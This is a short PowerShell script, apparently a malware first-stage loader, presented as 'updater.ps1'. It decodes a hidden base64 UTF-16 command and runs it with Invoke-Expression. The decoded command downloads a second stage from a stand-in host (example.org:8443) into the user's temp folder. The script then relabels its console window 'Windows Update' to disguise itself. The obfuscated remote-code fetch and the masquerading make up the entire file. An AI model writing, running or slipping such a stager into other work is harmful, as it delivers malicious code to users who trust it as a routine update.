<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\updater.ps1
#>
$EncodedBlob = (
    'JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABl' +
    "AC4AbwByAGcAOgA4ADQANAAzAC8AcwB0AGEAZwBlADIALgBwAHMAMQAiADsAIABJAG4AdgBvAGsA" +
    "ZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAg" +
    'AC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIA' +
    "aQBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=="
)
$ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedBlob))
Write-Verbose ("Decoded stage length: " + $ScriptBody.Length)
if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
    throw "Decoded stage was empty"
}
Invoke-Expression $ScriptBody

$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Output "stage 36 initialized"
Write-Verbose "stage marker 16 reached"
